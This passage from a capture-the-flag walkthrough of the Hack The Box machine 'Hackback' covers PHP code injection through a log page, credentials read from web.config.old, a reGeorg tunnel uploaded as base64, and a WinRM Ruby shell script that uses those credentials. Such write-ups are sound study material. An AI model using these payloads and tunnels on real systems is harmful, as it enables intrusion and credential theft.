ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200     33 L       54 W          614 Ch        "hackthebox"
000005:  C=200    102 L      345 W         4110 Ch        "www.hackthebox"
000008:  C=200     33 L       54 W          614 Ch        "www.htb"
000009:  C=400      6 L       26 W          334 Ch        ""
000006:  C=200     33 L       54 W          614 Ch        "www.hacktheboxeu"
000007:  C=200     33 L       54 W          614 Ch        "www.hackthebox.eu"
000002:  C=200     33 L       54 W          614 Ch        "hacktheboxeu"
000003:  C=200     33 L       54 W          614 Ch        "hackthebox.eu"
000004:  C=200     33 L       54 W          614 Ch        "htb"

Total time: 0.492524
Processed Requests: 9
Filtered Requests: 0
Requests/sec.: 18.27319
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">www.hackthebox</code> gave a different response length so it’s the right one. I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> :
<br><img src="/images/hackthebox/hackback/15.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">http://www.hackthebox.htb</code> :
<br><img src="/images/hackthebox/hackback/16.png" alt="" class="align-center"><br><br>
Just a fake Hack The Box login page. I entered test credentials :
<br><img src="/images/hackthebox/hackback/17.png" alt="" class="align-center"><br><br>
Then I checked the secret path again and did <code class="language-plaintext highlighter-rouge">list</code> :
<br><img src="/images/hackthebox/hackback/18.png" alt="" class="align-center"><br><br>
The logs increased by one. I did <code class="language-plaintext highlighter-rouge">show</code> and found the credentials I just sent :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'                                                                                                        
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
</code></pre></div></div>

<h2 id="php-code-injection-uploading-tunnel">PHP Code Injection, Uploading Tunnel</h2>
<p>With a functionality like this, there might be some injection somewhere. After some attempts I tried <code class="language-plaintext highlighter-rouge">php</code> code and it was executed :
<br><img src="/images/hackthebox/hackback/19.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/hackback# curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'
[05 July 2019, 04:49:52 PM] 10.10.xx.xx - Username: test, Password: test
[05 July 2019, 05:00:20 PM] 10.10.xx.xx - Username: , Password: whatever
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">username</code> is empty instead of printing the text I have sent, which means that it got executed as <code class="language-plaintext highlighter-rouge">php</code>. However all the functions we would use to get <code class="language-plaintext highlighter-rouge">RCE</code> like <code class="language-plaintext highlighter-rouge">exec</code> and <code class="language-plaintext highlighter-rouge">system</code> are disabled so … no we won’t have a shell now.<br>
I wanted to list the files in the current directory so I used the <code class="language-plaintext highlighter-rouge">scandir()</code> function :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s1">'.'</span><span class="p">));</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/20.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="o">:~/</span><span class="nc">Desktop</span><span class="o">/</span><span class="no">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">hackback</span><span class="c1"># curl -b "PHPSESSID=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=33e7500a148c8300892750f3dfb8a8a1e155edd839763332d3452c9869664739'</span>
<span class="p">[</span><span class="mo">05</span> <span class="nc">July</span> <span class="mi">2019</span><span class="p">,</span> <span class="mo">05</span><span class="o">:</span><span class="mo">06</span><span class="o">:</span><span class="mi">37</span> <span class="no">PM</span><span class="p">]</span> <span class="mf">10.10.</span><span class="n">xx</span><span class="mf">.</span><span class="n">xx</span> <span class="o">-</span> <span class="nc">Username</span><span class="o">:</span> <span class="k">Array</span>
<span class="p">(</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">..</span>
    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">index</span><span class="mf">.</span><span class="n">html</span>
    <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">webadmin</span><span class="mf">.</span><span class="n">php</span>
<span class="p">)</span>
<span class="p">,</span> <span class="nc">Password</span><span class="o">:</span> <span class="n">whatever</span>
</code></pre></div></div>
<p>I went up one directory :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">));</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/21.png" alt="" class="align-center"><br><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">.</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mf">..</span>
    <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="n">bb6916122f1da34dcd916421e531578</span>
    <span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">App_Data</span>
    <span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">aspnet_client</span>
    <span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">css</span>
    <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">img</span>
    <span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">index</span><span class="mf">.</span><span class="n">php</span>
    <span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">js</span>
    <span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">logs</span>
    <span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">web</span><span class="mf">.</span><span class="n">config</span>
    <span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">web</span><span class="mf">.</span><span class="n">config</span><span class="mf">.</span><span class="n">old</span>
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">web.config</code> and <code class="language-plaintext highlighter-rouge">web.config.old</code> look interesting. I checked them and in <code class="language-plaintext highlighter-rouge">web.config.old</code> I found some credentials. I used the <code class="language-plaintext highlighter-rouge">file_get_contents()</code> function :
<code class="language-plaintext highlighter-rouge">&lt;?php echo file_get_contents('../web.config.old'); ?&gt;</code>
<br><img src="/images/hackthebox/hackback/22.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">web.config.old</code> :</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
    <span class="nt">&lt;system.webServer&gt;</span>
        <span class="nt">&lt;authentication</span> <span class="na">mode=</span><span class="s">"Windows"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;identity</span> <span class="na">impersonate=</span><span class="s">"true"</span>                 
            <span class="na">userName=</span><span class="s">"simple"</span> 
            <span class="na">password=</span><span class="s">"ZonoProprioZomaro:-("</span><span class="nt">/&gt;</span>
     <span class="nt">&lt;/authentication&gt;</span>
        <span class="nt">&lt;directoryBrowse</span> <span class="na">enabled=</span><span class="s">"false"</span> <span class="na">showFlags=</span><span class="s">"None"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/system.webServer&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
</code></pre></div></div>
<p>Credentials : <code class="language-plaintext highlighter-rouge">simple : ZonoProprioZomaro:-(</code>. However there’s no place to use these credentials. I went back to the <code class="language-plaintext highlighter-rouge">http</code> port 6666 and I executed <code class="language-plaintext highlighter-rouge">netstat</code>. I found that <code class="language-plaintext highlighter-rouge">winrm</code> was running internally :</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">        </span><span class="nl">"CimInstanceProperties"</span><span class="p">:</span><span class="w">  </span><span class="p">[</span><span class="w">
                                      </span><span class="s2">"Caption"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"Description"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"ElementName"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"InstanceID = </span><span class="se">\"</span><span class="s2">::1??49852??::1??5985</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"CommunicationStatus"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"DetailedStatus"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"HealthState"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"InstallDate"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"Name"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"OperatingStatus"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"OperationalStatus"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"PrimaryStatus"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"Status"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"StatusDescriptions"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"AvailableRequestedStates"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"EnabledDefault = 2"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"EnabledState"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"OtherEnabledState"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"RequestedState = 5"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"TimeOfLastStateChange"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"TransitioningToState = 12"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"AggregationBehavior"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"Directionality"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"CreationTime = 12/31/1600 4:00:00 PM"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"LocalAddress = </span><span class="se">\"</span><span class="s2">::1</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"LocalPort = 49852"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"OwningProcess = 0"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"AppliedSetting = 6"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"OffloadState = 0"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"RemoteAddress = </span><span class="se">\"</span><span class="s2">::1</span><span class="se">\"</span><span class="s2">"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"RemotePort = 5985"</span><span class="p">,</span><span class="w">
                                      </span><span class="s2">"State = 11"</span><span class="w">
                                  </span><span class="p">]</span><span class="err">,</span><span class="w">	
</span></code></pre></div></div>
<p>So somehow we need a proxy to run internally and make us able to connect to <code class="language-plaintext highlighter-rouge">winrm</code>. Luckily there’s <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">reGeorgSocksProxy</code></a>.<br>
I downloaded <code class="language-plaintext highlighter-rouge">tunnel.aspx</code>, converted it to <code class="language-plaintext highlighter-rouge">base-64</code> then I uploaded it using <code class="language-plaintext highlighter-rouge">file_put_contents()</code> and <code class="language-plaintext highlighter-rouge">base64_decode()</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"tunnel.aspx"</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK"</span><span class="p">));</span> <span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/23.png" alt="" class="align-center"><br><br>
Then I checked the tunnel :
<br><img src="/images/hackthebox/hackback/24.png" alt="" class="align-center"><br><br>
Great !</p>

<h2 id="running-the-proxy-server-shell-as-simple">Running the Proxy Server, Shell as simple</h2>
<p>First thing to do is to configure <code class="language-plaintext highlighter-rouge">proxychains</code> to use whatever port we like, I used 8888 :
<code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code> :
<br><img src="/images/hackthebox/hackback/25.png" alt="" class="align-center"><br><br>
Then I used <code class="language-plaintext highlighter-rouge">reGeorgSocksProxy.py</code> and gave it the port and the path :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python reGeorgSocksProxy.py -p 8888 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/26.png" alt="" class="align-center"><br><br>
Now we can connect as <code class="language-plaintext highlighter-rouge">simple</code>. I used Alamot’s winrm ruby shell :</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/ruby</span>
<span class="nb">require</span> <span class="s1">'winrm'</span>

<span class="c1"># Author: Alamot</span>

<span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span> 
  <span class="ss">endpoint: </span><span class="s1">'http://10.10.10.128:5985/wsman'</span><span class="p">,</span>
  <span class="ss">transport: :ssl</span><span class="p">,</span>
  <span class="ss">user: </span><span class="s1">'simple'</span><span class="p">,</span>
  <span class="ss">password: </span><span class="s1">'ZonoProprioZomaro:-('</span><span class="p">,</span>
  <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
<span class="p">)</span>

<span class="n">command</span><span class="o">=</span><span class="s2">""</span>

<span class="n">conn</span><span class="p">.</span><span class="nf">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span>
    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">"exit</span><span class="se">\n</span><span class="s2">"</span> <span class="k">do</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="s2">"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')"</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">.</span><span class="nf">output</span><span class="p">.</span><span class="nf">chomp</span><span class="p">)</span>
        <span class="n">command</span> <span class="o">=</span> <span class="no">STDIN</span><span class="p">.</span><span class="nf">gets</span>        
        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span>
            <span class="no">STDOUT</span><span class="p">.</span><span class="nf">print</span> <span class="n">stdout</span>
            <span class="no">STDERR</span><span class="p">.</span><span class="nf">print</span> <span class="n">stderr</span>
        <span class="k">end</span>
    <span class="k">end</span>    
    <span class="nb">puts</span> <span class="s2">"Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="p">.</span><span class="nf">exitcode</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/hackback/27.png" alt="" class="align-center"><br><br>
And …. no flag !</p>

<h2 id="cleanini--shell-as-hacker">clean.ini , Shell as hacker</h2>
<p>I checked <code class="language-plaintext highlighter-rouge">c:\</code> and found a strange directory called <code class="language-plaintext highlighter-rouge">util</code> :
<br><img src="/images/hackthebox/hackback/28.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">c:\util</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS hackback\simple@HACKBACK C:\&gt; cd util                              
PS hackback\simple@HACKBACK util&gt; ls

Directory: C:\util
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/14/2018   3:30 PM                PingCastle

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

-a----         5/4/2018  12:21 PM          23552 RawCap.exe
</code></pre></div></div>
<p>However there was a hidden directory, if we do <code class="language-plaintext highlighter-rouge">dir -force</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS hackback\simple@HACKBACK util&gt; dir -force

Directory: C:\util

Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                     
d-----       12/14/2018   3:30 PM                PingCastle

d--h--       12/21/2018   6:21 AM                scripts

-a----         3/8/2007  12:12 AM         139264 Fping.exe

-a----        3/29/2017   7:46 AM         312832 kirbikator.exe

-a----       12/14/2018   3:42 PM           1404 ms.hta

-a----        2/29/2016  12:04 PM         359336 PSCP.EXE

-a----        2/29/2016  12:04 PM         367528 PSFTP.EXE

